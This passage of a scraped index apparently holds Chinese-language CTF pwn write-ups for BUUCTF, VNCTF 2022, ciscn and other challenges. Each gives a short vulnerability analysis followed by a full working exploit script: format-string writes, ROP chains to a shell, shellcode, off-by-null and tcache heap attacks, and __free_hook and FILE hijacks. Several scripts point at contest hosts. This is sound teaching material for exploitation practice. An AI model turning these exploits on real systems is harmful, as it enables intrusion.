log_address(\"stack_addr\", stack_addr) log_address(\"libc_addr\", libc_addr) log_libc_base_addr(libc_base) data = \"%{}c%24$hn\".format(target_addr \u0026 0xffff) sla(\"please input the key:\\n\", data) r() data = \"%{}c%61$hn\".format(libc.sym.gets \u0026 0xffff) sla(\"please input the key:\\n\", data) r() data = \"%{}c%24$hn\".format((target_addr+2) \u0026 0xffff) sla(\"please input the key:\\n\", data) r() data = \"%{}c%61$hn\".format((libc.sym.gets \u003e\u003e 16) \u0026 0xffff) sla(\"please input the key:\\n\", data) r() target_addr += 8 data = \"%{}c%24$hn\".format((target_addr) \u0026 0xffff) sla(\"please input the key:\\n\", data) r() data = \"%{}c%61$hn\".format(stack_addr \u0026 0xffff) sla(\"please input the key:\\n\", data) r() sla(\"please input the key:\\n\", \"hello\") r() # sl(b\"a\"*8+p32(stack_addr+0x20)+b\"\\x90\"*0x30+ShellcodeMall.i386.cat_flag) ia() 远程： Picoctf_2018_gps\rret2shellcode EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() m = rls(\"Current position:\") log_ex(f\"get msg: {m}\") stack_addr = int16_ex(m[-14:]) log_address(\"stack_addr\", stack_addr) sla(\"What's your plan?\\n\u003e \", b\"\\x90\"*0x800 + ShellcodeMall.amd64.cat_flag) sla(\"Where do we start?\\n\u003e \", hex(stack_addr+0x400)) ia() 远程打： Rootersctf_2019_xsh\r本质上是一个格式化字符串的题 漏洞点\rEXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] sla(\"$ \", \"echo xxx%p\") ru(\"xxx\") m = rl() code_base = int16_ex(m) - 0x23ae log_libc_base_addr(code_base) elf.address = code_base sla(\"$ \", b\"echo xxx\" + fmtstr_payload(offset=25, writes={elf.got.strncmp : elf.sym.system}, numbwritten=3, write_size=\"short\", write_size_max=\"short\")) sla(\"$ \", \"/bin/bash\") sl(\"cat flag\") ia() 远程打： Redhat_2019_three\r观察执行shellcode时的寄存器值，巧妙地利用xchg esp, ecx;ret进行rop。 漏洞点\r可以写3个字节的shellcode。 那么可以在call eax的时候断住看看寄存器状态： ECX正好是0x80f6cc0，那么可以直接交换esp和ecx后进行rop。 正好3个字节，满足要求。 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() sla(\"Give me a index:\\n\", \"0\") sa(\"Three is good number,I like it very much!\\n\", \"\\x87\\xcc\\xc3\") sla(\"Leave you name of size:\\n\", str(0x200)) # ROPgadget --binary ./redhat_2019_three --ropchain from struct import pack # Padding goes here p = b'' p += pack('\u003cI', 0x08072f8b) # pop edx ; ret p += pack('\u003cI', 0x080f5000) # @ .data p += pack('\u003cI', 0x080c11e6) # pop eax ; ret p += b'/bin' p += pack('\u003cI', 0x080573e5) # mov dword ptr [edx], eax ; ret p += pack('\u003cI', 0x08072f8b) # pop edx ; ret p += pack('\u003cI', 0x080f5004) # @ .data + 4 p += pack('\u003cI', 0x080c11e6) # pop eax ; ret p += b'//sh' p += pack('\u003cI', 0x080573e5) # mov dword ptr [edx], eax ; ret p += pack('\u003cI', 0x08072f8b) # pop edx ; ret p += pack('\u003cI', 0x080f5008) # @ .data + 8 p += pack('\u003cI', 0x080569a0) # xor eax, eax ; ret p += pack('\u003cI', 0x080573e5) # mov dword ptr [edx], eax ; ret p += pack('\u003cI', 0x080481d9) # pop ebx ; ret p += pack('\u003cI', 0x080f5000) # @ .data p += pack('\u003cI', 0x08072fb2) # pop ecx ; pop ebx ; ret p += pack","date":"2022-03-08","objectID":"/zh-cn/2022-03-08-buuctf-pwn-tasks-20/:0:0","tags":["pwn"],"title":"buuctf-pwn-tasks-20","uri":"/zh-cn/2022-03-08-buuctf-pwn-tasks-20/"},{"categories":["pwn-wp"],"content":"总结\r利用了一个组合拳gadget： .text:00010620 MOV R2, R9 .text:00010624 MOV R1, R8 .text:00010628 MOV R0, R7 .text:0001062C BLX R3 .text:00010630 CMP R4, R6 .text:00010634 BNE loc_10618 .text:00010638 POP {R4-R10,PC} 这一段gadget在init函数，其实和ret2csu有点像，可以通过r7 r8 r9控制r0 r1 r2，还能控制pc。 Checksec\r漏洞点\r拍在脸上的栈溢出： 利用思路\r结合最上面总结的那两个gadgets，利用过程为： 控制r7 r8 r9而间接控制r0 r1 r2，而使用0x000103a4 : pop {r3, pc}控制r3 调用puts(printf@got)泄露出libc地址 再一次执行main函数，rop执行system(\"/bin/sh\")即可 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * import shlex context.binary = \"./1\" libc = ELF(\"libc-2.23.so\") io = remote(\"node4.buuoj.cn\", 25228) io.sendafter(\"your name:\\n\\n\", flat({ 36:[ 0x000103a4, 0x103e0, 0x00010638, 0,0,0,0x21010,0,0,0,0x00010628, 0, 0, 0, 0, 0, 0, 0, 0x10590] })) io.recvline_startswith(\"hello\") m = io.recvline() log_ex(f\"Get msg: {m}\") libc_base = u32_ex(m[:4]) - 0x00047b30 log_libc_base_addr(libc_base) libc.address = libc_base io.sendafter(\"your name:\\n\\n\", flat({ 36:[ libc_base + 0x0010dc84, libc.search(b\"/bin/sh\").__next__(), libc.sym.system] })) # 0x0011e54c : pop {r0, pc} io.interactive() 远程打： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2022-03-05","objectID":"/zh-cn/2022-03-05-ciscn-2019-en-1/:0:0","tags":["pwn"],"title":"ciscn_2019_en_1","uri":"/zh-cn/2022-03-05-ciscn-2019-en-1/"},{"categories":["pwn-wp"],"content":"总结\r基础的ret2shellcode的题目，直接用pwntools生成shellcode即可。 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * context.binary = \"./root_me_stack_buffer_overflow_basic\" context.log_level = \"debug\" io = remote(\"node4.buuoj.cn\", 29064) sh = shellcraft.sh() data = \"aaaa\" io.sendlineafter(\"Give me data to dump:\\n\", data) m = io.recvline() log_ex(f\"Get msg: {m}\") stack_addr = int16_ex(m[:10]) log_address(\"stack_addr\", stack_addr) io.sendlineafter(\"Dump again (y/n):\\n\", \"y\") data = flat({ 0:asm(sh), 164: stack_addr }) io.sendlineafter(\"Give me data to dump:\\n\", data) io.sendlineafter(\"Dump again (y/n):\\n\", \"n\") io.sendline(\"cat flag\") io.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2022-03-05","objectID":"/zh-cn/2022-03-05-root-me-stack-buffer-overflow-basic/:0:0","tags":["pwn"],"title":"root_me_stack_buffer_overflow_basic","uri":"/zh-cn/2022-03-05-root-me-stack-buffer-overflow-basic/"},{"categories":["pwn-wp"],"content":"总结\r高版本的off by null不能像之前那样随便地后向合并了，因为对size域的检查更加严格。因此，在高版本的off by null，利用姿势小结如下： 如果有地址泄露，最起码可以泄露出libc地址，可以利用last_remainder这个指针；如果能泄露出堆地址，直接构造unlink即可 如果没有地址泄露，可以利用残留地址，进行利用，主要是largebin的fd_nextsize和bk_nextsize，samllbin的残留bk和fastbin的残留fd。围绕这几个构造堆重叠。 Checksec\r保护全开，使用的libc版本为glibc-2.30.so。 程序分析\r这里记录下在IDA中switch table的修复： 在跳表出点击edit-\u003eother-\u003especify switch idiom，然后填写基址、跳转的分支个数、reg即可。其实简单的程序，不需要修复，看汇编也能看懂。 漏洞点\r在edit分支的明显的off by null: 利用思路\r由于这题的add和edit是分开的，那么就有很多残留的指针，就可以用show去泄露出来。 因此，本题不需要利用残留的指针即可完成利用。总结利用思路为： 利用残留的指针分别泄露出libc地址和heap地址 在堆上构造unlink，构造重叠的堆块布局 使用tcachebin poisoning分配到__free_hook 最后利用setcontext+orw读取flag EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] def add(size): sla(\"Choice:\", \"1\") sla(\"Size: \", str(size)) def edit(idx, data): sla(\"Choice:\", \"2\") sla(\"Index: \", str(idx)) sa(\"Content: \", data) def dele(idx): sla(\"Choice:\", \"3\") sla(\"Index: \", str(idx)) def show(idx,n=6): sla(\"Choice:\", \"4\") sla(\"Index: \", str(idx)) ru(\"Content: \") return rvn(n) # 泄露libc和堆地址 add(0x410) # 0 add(0x20) # 1 add(0x20) # 2 add(0x4f0) # 3 add(0x10) # 4 add(0x20) # 5 dele(0) add(0x410) # 0 m = show(0) libc_base = u64_ex(m) - 0x1eabe0 log_libc_base_addr(libc_base) libc.address = libc_base dele(1) dele(2) add(0x28) # 1 m = show(1) heap_base = u64_ex(m) - 0x6c0 log_heap_base_addr(heap_base) add(0x28) # 2 edit(1, p64(heap_base+0x6c0)+0x18 * b\"a\" + p64(0x50)) edit(2, p64(0)+p64(0x51)+p64(heap_base+0x6f0-0x18)+p64(heap_base+0x6f0-0x10)) dele(3) add(0x100) # 3 edit(3, flat({0x18:0x31})) dele(5) dele(1) edit(3, flat({0x18:[ 0x31,p64(libc.sym['__free_hook'])[:7] ]})) add(0x20) add(0x20) # 5 # 0x0000000000154b90 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20] edit(5, p64(libc_base + 0x0000000000154b90)) start_addr = heap_base + 0x2a0 edit(0, flat({ 0: start_addr+0x100, 0x8:start_addr, 0x20: libc.sym['setcontext']+61, 0xa0: start_addr, # rsp 0xa8: libc.sym.mprotect, # rcx 0x68: start_addr \u0026~0xfff, # rdi 0x70: 0x4000, 0x88: 7, 0x100: ShellcodeMall.amd64.execveat_bin_sh }, filler=\"\\x00\")) dele(0) # 用execveat拿的shell，所以需要用原生命令读取flag sl(\"read -r line \u003c /flag;echo $line\") ia() 远程打： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2022-03-05","objectID":"/zh-cn/2022-03-05-ycb-2020-easy-heap/:0:0","tags":["pwn"],"title":"ycb_2020_easy_heap","uri":"/zh-cn/2022-03-05-ycb-2020-easy-heap/"},{"categories":["pwn-wp"],"content":"总结\r看上去花里胡哨的，其实就是对栈空间的一个利用。 Checksec\rlibc-2.23.so。 漏洞点\r漏洞在checkout上，可以将栈上的Apple添加到链表中，而栈上的空间是可控的： 利用思路\r恢复出结构体： struct Apple { char *info; int price; struct Apple* next; struct Apple* pre; }; 利用上面的漏洞，思路为： 将栈上的Apple放入链表 控制栈上的apple-\u003einfo，修改为一个got表地址，泄露libc地址；修改为libc.sym['__environ']泄露栈地址 利用delete的解链，将_IO_2_1_stdout_的vtable写为栈地址，并利用printf调用链，控制执行gets(stdout) delete结束后，然后继续利用printf调用链，执行system(\"/bin/sh\") EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] if gift.remote: libc = ELF(\"./libc.so.6\") def list_apple(): sla(\"\u003e \", \"1\") def add(data): if isinstance(data, int): data = str(data) sla(\"\u003e \", \"2\") sla(\"Device Number\u003e \", data) ru(\"You've put *\") m = rl() log_ex(f\"get msg: {m}\") return m def dele(data): if isinstance(data, int): data = str(data) sla(\"\u003e \", \"3\") sla(\"Item Number\u003e \", data) m = rls(\"Remove\") log_ex(f\"get msg: {m}\") return m def cart(check=\"y\", n=1): sla(\"\u003e \", \"4\") sla(\"Let me check your cart. ok? (y/n) \u003e \", check) m = rs(n) log_ex(f\"get msg: {m}\") return m def checkout(check=\"y\", n=1): sla(\"\u003e \", \"5\") sla(\"Let me check your cart. ok? (y/n) \u003e \", check) m = rs(n) log_ex(f\"get msg: {m}\") return m # [7, 18, 0, 1] for i in range(18): add(2) for i in range(7): add(1) add(4) # 满足checkout条件 checkout(n=26) # 泄露libc地址 *_, m = cart(check=b\"yy\"+p32(elf.got.atoi)+p32(0)*3, n=28) atoi_addr = u32_ex(m[4:8]) log_address(\"atoi_addr\", atoi_addr) libc_base = atoi_addr - libc.sym.atoi log_libc_base_addr(libc_base) libc.address = libc_base # 泄露栈地址 *_, m = cart(check=b\"yy\"+p32(libc.sym['__environ'])+p32(0)*3, n=28) stack_addr = u32_ex(m[4:8]) log_address(\"stack_addr\", stack_addr) buf_addr = stack_addr - 0x124 log_address(\"buf_addr\", buf_addr) sla(\"\u003e \", \"3\") # 控制执行gets sla(\"Item Number\u003e \", b\"27\"+p32(0)+p32(libc.sym.gets)+p32(libc.sym['_IO_2_1_stdout_'] + 148-0xc) + p32(buf_addr+4-0x1c)+b\"aa\") sleep(1) # 伪造stdout结构体 payload = flat({ 0:\"\\x20/bin/sh;\", 56:1, 64:0xffffffff, 76: 0xffffffff, 80: 0xffffffff, 104: 0xffffffff, 72: libc.sym['__free_hook'] - 0x40, 148: libc.sym['_IO_2_1_stdout_']+148, 152: p32(libc.sym['_IO_2_1_stderr_'])+p32(libc.sym['_IO_2_1_stdout_'])\\ +p32(libc.sym['_IO_2_1_stdin_'])+p32(libc.sym.system)*7 }, filler=\"\\x00\") io.sendline(payload) ia() 远程打： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2022-03-04","objectID":"/zh-cn/2022-03-04-pwnable-applestore/:0:0","tags":["pwn"],"title":"pwnable_applestore","uri":"/zh-cn/2022-03-04-pwnable-applestore/"},{"categories":["pwn-wp"],"content":"总结\r表面看是迷宫，其实是一道off by null的题目。在已知指针数组情况下的off by null，一般来说用unlink是最快最有效的。 Checksec\r给的libc是2.23的，远程的是2.27。 漏洞点\r在read_input函数中： 主要在store中使用了： 利用思路\r恢复一下结构体： struct Mazes{ int start_x; int start_y; int step; char *name; }; 结合漏洞，利用思路为： 利用store构造off by null 使用unlink构造重叠的堆 利用resume泄露出libc地址 使用tcache bin poisoning劫持__free_hook为system地址 释放/bin/sh块 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() elf: ELF = gift['elf'] libc: ELF = gift['libc'] def resume(size = 0, data=\"\"): sla(\"\u003e \", \"0\") m = rls(b\"hello\") m2 = rls(\"X:\") sla(\"input you ops count\\n\", str(size)) if size \u003e 0: sa(\"ops: \", data) log_ex(f\"Get msg: {m}\") log_ex(f\"Get msg: {m2}\") return m, m2 def new(name=\"roderick\", data=\"\"): sla(\"\u003e \", \"1\") sla(\"what's your name?\\n\", name) m = rls(b\"hello\") sla(\"input you ops count\\n\", str(len(data))) if len(data) \u003e 0: sa(\"ops: \", data) log_ex(f\"Get msg: {m}\") return m def load(idx, data): sla(\"\u003e \", \"2\") sla(\"index?\\n\", str(idx)) m = rls(b\"hello\") sla(\"input you ops count\\n\", str(len(data))) if len(data) \u003e 0: sa(\"ops: \", data) log_ex(f\"Get msg: {m}\") return m def store(size, data, yes= \"y\"): sla(\"\u003e \", \"3\") sa(\"any comment?\\n\", yes) if yes == \"y\": sla(\"comment size?\\n\", str(size)) sa(\"plz input comment\\n\", data) def dele(idx): sla(\"\u003e \", \"4\") sla(\"index?\\n\", str(idx)) new() store(0x420, \"deadbeef\\n\") new() store(0x38, \"deadbeef\\n\") dele(1) new() store(0x4f0, \"deadbeef\\n\") new() # off by null store(0x38, 0x30 * b\"a\" + p64(0x4c0)) dele(0) dele(1) # unlink new() resume(0x420, \"deadbeef\") _, m = resume(0) res = m.split() # leak libc addr l = int(res[0][2:-1].decode()) \u0026 0xffffffff h = int(res[1][2:-1].decode()) \u0026 0xffffffff libc_addr = (h \u003c\u003c 32) + l - 0x3ebca0 log_libc_base_addr(libc_addr) libc.address = libc_addr # tcache bin poisoning resume(0x470, flat({ 0x420:{ 0: [0, 0x51] } })) store(0, \"\", \"n\") dele(0) new() resume(0x470, flat({ 0x420:{ 0: [0, 0x51, libc.sym['__free_hook']] } })) store(0x40, \"/bin/sh\\x00\\n\") new() store(0x40, p64(libc.sym.system)+b\"\\n\") dele(0) get_current_flag_when_get_shell() ia() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2022-03-04","objectID":"/zh-cn/2022-03-04-ciscn-2019-final-6/:0:0","tags":["pwn"],"title":"ciscn_2019_final_6","uri":"/zh-cn/2022-03-04-ciscn-2019-final-6/"},{"categories":["pwn-wp"],"content":"总结\r好了，下一道。 Checksec\r题目的架构为aarch64，小端序。 程序分析\r分析后发现为经典的增删改查的题目，漏洞点也比较多，这里给出几个漏洞点： 在edit函数中，没有校验索引和大小 在read_input函数中，存在off by null： 在dele分支中，没有校验索引 在secret分支中，可以泄露地址 利用过程\r调试后发现，程序没有开启aslr，所以每次启动的地址都是一样的 利用secret泄露出libc地址，然后利用fastbin attack修改堆指针，最后用edit将atoi@got修改为system地址 用unsorted bin chunk的fd/bk泄露libc地址： 计算出远程的system地址为：0x400086f818 然后fastbin attack打即可： EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- from pwn import * context.update(arch=\"aarch64\", os=\"linux\", endian=\"little\", log_level=\"debug\", timeout=10) io = remote(\"121.40.89.206\", 10041) def add(size): io.sendlineafter(\"\u003e \", \"1\") io.sendlineafter(\"size:\", str(size)) def edit(idx, data): io.sendlineafter(\"\u003e \", \"2\") io.sendlineafter(\"id:\", str(idx)) if not data.endswith(b\"\\n\") and len(data) \u003c 0x18: data += b\"\\n\" io.sendafter(\"content:\", data) def dele(idx): io.sendlineafter(\"\u003e \", \"3\") io.sendlineafter(\"id: \", str(idx)) def secret(data): io.sendlineafter(\"\u003e \", \"110\") io.sendafter(\"ohhhh!you find a secret \\n\", data) # leak addr # add(0x80) # add(0x10) # dele(0) # secret(\"a\"*8) # msg = io.recvall(timeout=3) # print(msg) # io.close() # exit(0) add(0x80) add(0x30) dele(1) # 修改fd edit(1, p64(0x41209a)) # fastbin attack add(0x30) add(0x30) edit(3, b\"\\x41\" + b\"\\x00\" * 5 + p64(0x412010)) # atoi@got system_addr = 0x400086f818 edit(2, p64(system_addr)[:6]) io.sendline(\"/bin/sh\") io.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2022-02-23","objectID":"/zh-cn/2022-02-23-pwnhub-public-2-babyarm/:0:0","tags":["pwn"],"title":"pwnhub-public-2-babyarm","uri":"/zh-cn/2022-02-23-pwnhub-public-2-babyarm/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： arm指令集下的pwn题，和x86没有啥区别，只需要把指令集学明白，技巧都是一样的。 practice makes perfect! Checksec\r漏洞点\r在sub_8d24函数中，存在栈溢出： 利用思路\r观察以下溢出函数的结束部分： 最后会从栈里面弹一个值到pc寄存器。那么存在栈溢出的时候，只需要控制pc寄存器即可，这里找到一个gadget： 0x00020904 : pop {r0, r4, pc} 然后只要找到system函数和/bin/sh字符串即可完成利用。找system还是找exit 0这个字符串。 EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * filename = \"./typo\" context.binary = filename def debug(*addrs): bps = \"\" for x in addrs: bps += f\"-ex 'b * {hex(x)}'\" os.system(f\"tmux splitw -h \\\"gdb-multiarch {filename} -q -ex 'target remote 127.0.0.1:1234' {bps}\\\"\") bin_sh_addr = context.binary.search(b\"/bin/sh\").__next__() payload = flat({ 0x70: [ 0x00020904, # pop r0 r4 pc bin_sh_addr, 0, 0x110b4 # system ] }) io = process([\"qemu-arm-static\", \"-g\", \"1234\", filename]) debug(0x8de8) io.recv() io.send(b\"\\n\") io.recv() io.send(payload) io.interactive() 最后getshell： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2022-02-21","objectID":"/zh-cn/2022-02-21-buuctf-jarvisoj-typo/:0:0","tags":["pwn"],"title":"BUUCTF-jarvisoj_typo","uri":"/zh-cn/2022-02-21-buuctf-jarvisoj-typo/"},{"categories":["pwn-wp"],"content":"VNCTF-2022-Pwn-Wp\rV\u0026NCTF2022比赛中pwn的题wp，更新完毕。 上午在HideOnHeap中浪费了太多的时间，尝试了好几个思路都失败了，以后还是不能太头铁（下次还敢 平时得多积累一些有用的函数或脚本，比如_IO_str_finish拿shell的IO_FILE构造函数 Clear_got\rChecksec\r没有给libc，后来测出来远程使用的版本是libc6_2.23-0ubuntu10_amd64。 漏洞点\rmain函数就一个简单直接的栈溢出，但是got表被清空，没完全清空，还剩下__libc_start_main。后面的stdout和stdin也都在数据段上。 利用思路\r清空了got表，考虑使用ret2syscall，发现程序中有syscall; ret。这里主要是利用了一个gadget： 0x000000000040075c: mov eax, 0; leave; ret; 结合end2函数，正好可以泄露出libc地址后，执行构造syscall调用read函数，再重新给got表填上。最终思路为： 栈溢出并利用end2泄露出__libc_start_main地址和_IO_2_1_stdout_地址 使用libc-search1或者libc-search2查询出远程的libc版本 重新给puts@got填为system 调用puts@plt，实际执行system(\"/bin/sh\")获取shell EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] # remote libc: libc6_2.23-0ubuntu10_amd64 \"\"\" 0x000000000040077e: syscall; ret; 0x00000000004007f3: pop rdi; ret; 0x00000000004007f1: pop rsi; pop r15; ret; 0x0000000000400539: ret; 0x000000000040075c: mov eax, 0; leave; ret; \"\"\" pop_rdi = 0x00000000004007f3 pop_rsi_r15 = 0x00000000004007f1 sysret = 0x000000000040077e payload = flat({ 0x60:[ 0x000000000040075c, pop_rdi, 1, pop_rsi_r15, 0x601040, 0, 0x400773, pop_rdi, 0, pop_rsi_r15, 0x601008, 0, sysret, pop_rdi, 0x601008, elf.plt.puts ] }, length=0x100, filler=\"\\x00\") io.sendafter(\"Welcome to VNCTF! This is a easy competition.///\\n\", payload) msg = io.recvn(0x38) libc_start_main = u64(msg[:8]) stdout = u64(msg[0x20:0x28]) log_address(\"libc_start_main\", libc_start_main) log_address(\"stdout\", stdout) libc_base = libc_start_main - 0x020740 # __libc_start_main offset log_libc_base_addr(libc_base) log_address(\"stdout offset\", stdout - libc_base) # validate libc io.send(flat({ 0: \"/bin/sh\\x00\", 8: [libc_base + 0x045390]*6 # system })) io.interactive() 远程打： EasyROPtocol\r这题其实本地很快出来了，但是远程打10次成功1次，搞不好中间哪一次就挂了，不知道是不是网的问题。每次send 0x1000个字节过去，要睡眠好长时间才能得到远程的回显，而且中间极容易挂，其实可以把报文长度调小一点，只要能打栈溢出就行。赛后尝试每次发送0xe00大小的字节过去，但还是挂(真是要命 所以这题啊，多试试，试试就逝世。 Checksec\r没有开PIE和栈保护。远程的libc版本为：libc6_2.31-0ubuntu9.2_amd64。 开启了沙箱： 漏洞点\r在submit函数中，存在栈溢出： 利用思路\r漏洞点很简单，关键是需要构造好报文，然后可以触发submit中的栈溢出漏洞。 分析出报文的组成为： struct message { uint32_t heap; // 固定值 0x28b7766e uint32_t size; // submit函数中的memcpy会校验，依次为1 0x1001 0x2001 0x3001 uint32_t _1; // 不能为0 uint16_t type; // 要么为5要么为6 uint16_t _2; // 不能为0 uint16_t check_sum; // 校验和 uint16_t _3; // 必须为0 uint16_t flag1; // 可控制submit函数的分支 uint16_t flag2; // 当type为6时，必须为0xffff char data[]; // 数据 }; 计算校验和就是把整个报文加上一个fakeipheadfa，每两个字节取整数，然后异或，最后得到的值填充到check_sum。 因此，利用思路总结如下： 构造好4个报文 利用栈溢出，使用write泄露出libc地址（submit函数溢出后rdx为6，正好可以泄露地址） 再执行一次main函数 使用libc中的gadgets，用orw拿flag EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: roderick from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] def calc_sum(payload): res = 0 payload = b\"fakeipheadfa\" + payload assert len(payload) % 2 == 0 for i in range(len(payload) // 2): tmp = payload[2*i: 2*i+2] tmp = int.from_bytes(tmp, \"little\") res ^= tmp return res def get_message(size, data=b\"\"): payload = b\"\" payload += p32(0x28b7766e) # head payload += p32(size) payload += p32(1) payload += p16(6) payload += p16(1) # 7 # check sum后续补上 payload += p16(0) payload += p16(1) # 10 payload += p16(0xffff) payload += data last = payload[:0x10]+p16(calc_sum(payload))+payload[0x10:] return last def create(size, data=b\"\"): io.sendlineafter(\"4. Quit.\\n\", \"1\") sleep(1) data = get_message(size, data) print(f\"send message, message length: {len(data)}\") io.send(data) sleep(5) def delete(idx): io.sendlineafter(\"4. Quit.\\n\", \"2\") sleep(1) io.sendlineafter(\"Which?\", str(idx)) def submit(): io.sendlineafter(\"4. Quit.\\n\", \"3\") sleep(3) context.update(timeout=10) payload = cyclic(0xfe8) create(1, payload) create(0x1001, payload) create(0x2001, payload) pop_rsi_r15= 0x0000000000401bb1 pay_attack = flat( [ pop_rsi_r15, elf.got.atoi, 0, elf.plt.write, 0x401a5e ] ) create(0x3001, flat({112:pay_attack}, length=0x400)) submit() libc_base = recv_current_li","date":"2022-02-12","objectID":"/zh-cn/2022-02-12-vnctf2022-pwn-wp/:0:0","tags":["pwn"],"title":"V\u0026NCTF2022-pwn-wp","uri":"/zh-cn/2022-02-12-vnctf2022-pwn-wp/"},{"categories":["pwn-wp"],"content":"总结\r题目的利用点比较难发现，找到漏洞点后利用就很简单。主要是利用栈上的任意地址的1字节修改，和修改后的地址的可控的2字节写完成利用。 密码库Carypto的使用过程中尽量使用long_to_bytes这样的接口去转换数字和字节，直接用pwntools的p64之类的容易被坑。 题目分析\r保护全开，使用的libc版本为2.23。 总的来看，题目实现了一套blowfish的ECB模式加解密，其中key是随机初始化的，但是其指针存在data段；解密后的值也存储在data段；最多只能加解密8个字节。 漏洞点\r在blowfish_dec函数中，最后解密写入结果的时候有个栈上任意1字节修改的漏洞： 这里的v5是解密的高4个字节，可控。即可利用这个漏洞修改v8指针的值，然后往v8里面写入可控的最高位的两个字节。 利用思路\r结合上图，v8中原本存储的地址为$rebase(0x204048)，而存储加密的主密钥key的地址为$rebase(0x204040)，挨得很近，因此，可以修改主密钥key的指针。那么，当这个指针的高字节为0的时候，我们可以利用加密后的内容爆破出指针指向的地址的低字节的值。 因此，利用思路如下： 利用修改漏洞修改key指针，使其为一个堆地址，且堆地址存储着libc地址，这里可以构造unsorted bin chunk获得libc地址 爆破出libc地址 修改下方的$rebase(0x2040b0)为\u0026__free_hook - 2 用已知密钥解密system地址，然后加密1次，即可往__free_hook写入system地址 释放/bin/sh块获取shell EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: lynne from pwncli import * from Crypto.Cipher import Blowfish from Crypto.Util.number import long_to_bytes, bytes_to_long cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] def add_note(idx:int, length:int, price: str or bytes=\"/bin/sh\\x00\"): io.sendlineafter(\"Choice:\\n\", \"1\") io.sendlineafter(\"Input the id:\\n\", str(idx)) io.sendlineafter(\"Input the length:\\n\", str(length)) io.sendafter(\"Input note price:\\n\", price) def dele_note(idx): io.sendlineafter(\"Choice:\\n\", \"2\") io.sendlineafter(\"Input the id:\\n\", str(idx)) def enc(num:int): io.sendlineafter(\"Choice:\\n\", \"5\") io.sendafter(\"Please input the message:\\n\", p64(num)) m = io.recvline(keepends=False) info(f\"Get msg: {m}\") return int16_ex(m) def dec(num: int): io.sendlineafter(\"Choice:\\n\", \"6\") io.sendafter(\"Please input the message:\\n\", p64(num)) def bye(): io.sendlineafter(\"Choice:\\n\", \"7\") def blowfish_getkey(data: str, cur_key: bytes, enc_res: int): for i in range(0x100): key1 = p8(i) + cur_key key = key1.ljust(8, b\"\\x00\") bf = Blowfish.new(key, mode=Blowfish.MODE_ECB) res = bf.encrypt(data) # log_ex(f\"current key: {key}, current res: {res.hex()}\") if res== long_to_bytes(enc_res): log_ex(f\"Find key: {key1}\") return key1 \"\"\" 0. 得到unsortedbin 1. 利用 if ( v6 == 0x867D33FB ) *((_BYTE *)\u0026i + (BYTE1(v5) \u0026 0x3F)) = v5; *v8 = v6 | ((unsigned __int64)v5 \u003c\u003c 0x20); 修改v8指针 修改key 2. 爆破出libc地址 3. 修改enc_save_ptr 为__free_hook -2 4. 修改__free_hook为system \"\"\" low32 = 0x867D33FB high32 = 0x3c000e39 add_note(0, 0x80) add_note(1, 0x60) dele_note(0) res = b\"\\x7f\" for _ in range(5): # 修改指针 enc_num = enc((high32 \u003c\u003c 32)+low32) dec(enc_num) high32 -= 0x1000000 # 爆破 enc_num = enc((high32 \u003c\u003c 32) + low32) res = blowfish_getkey(p64((high32 \u003c\u003c 32) + low32)[::-1], res, enc_num) if not res: error(f\"high32: {hex(high32)}\") res = res.ljust(8, b\"\\x00\") libc_base = u64(res) - 0x3c4bf8 log_libc_base_addr(libc_base) libc.address = libc_base free_hook = libc.sym['__free_hook'] - 2 log_address(\"free_hook\", free_hook) bf = Blowfish.new(res, mode=Blowfish.MODE_ECB) system_dec = bf.decrypt(long_to_bytes(libc.sym['system']).ljust(8, b\"\\x00\")) log_ex(f\"system dec: {system_dec}\") for i in range(3): hhh = (free_hook \u003e\u003e (32 - i * 16)) \u0026 0xffff lll = 0x0eae - i * 2 high32 = (hhh \u003c\u003c 16) | lll res_num = bf.encrypt(p64((high32 \u003c\u003c 32) + low32)[::-1]) res_num = bytes_to_long(res_num) dec(res_num) enc(bytes_to_long(system_dec)) dele_note(1) io.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2022-01-17","objectID":"/zh-cn/2022-01-17-hfctf-2020-encnote/:0:0","tags":["pwn"],"title":"hfctf_2020_encnote","uri":"/zh-cn/2022-01-17-hfctf-2020-encnote/"},{"categories":["tools"],"content":"frp and 